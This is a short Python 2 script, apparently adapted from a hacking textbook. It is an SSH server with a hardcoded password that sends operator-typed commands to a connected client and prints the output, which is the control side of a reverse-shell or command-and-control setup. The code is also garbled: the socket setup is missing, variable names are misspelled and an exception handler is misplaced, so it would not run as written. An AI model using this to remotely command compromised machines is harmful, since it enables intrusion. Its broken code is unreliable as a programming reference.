import socket
import paramiko
import threading
import sys
# using the key from the paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key') # change the file name

class Server (paramiko.ServerInterface):
	def __init__(self):
		self.event = threading.Event()
	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINSTRATIVELY_PROHIBITED

	def check_auth_password(self, username, password):
		if (username == 'justin') and (password == 'lovesthepython'): # change the password
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED

sever = sys.argv[1]
ssh_port = int(sys.argv[2])

try:
	bhSession = paramiko.Transport(client)
	bhSession.add_server_key(host_key)
	server = Server()
	try:
		bhSession.start_server(server=server)
	except paramiko.SSHException, x:
		print '[-] SSH negotiation failed'
	chan = bhSession.accept(20)
	print '[+] Authenticated!'
	chan.send('Welcome to bb_ssh')
	while True:
		try: 
			command = raw_input("Enter Command: ").strip('\n')
			if command != 'exit':
				chan.send(command)
				print chan.recv(1024) + '\n'
			else:
				chan.send('exit')
				print 'exiting'
				bhSession.close()
				raise Exception('exit')
			except keyboardInterrupt:
				bbSession.close()
		except Exception, e:
			print '[-] Caught Exception: ' + str(e)
			try:
				bhSession.close()
			except:
				pass
			sys.exit(1)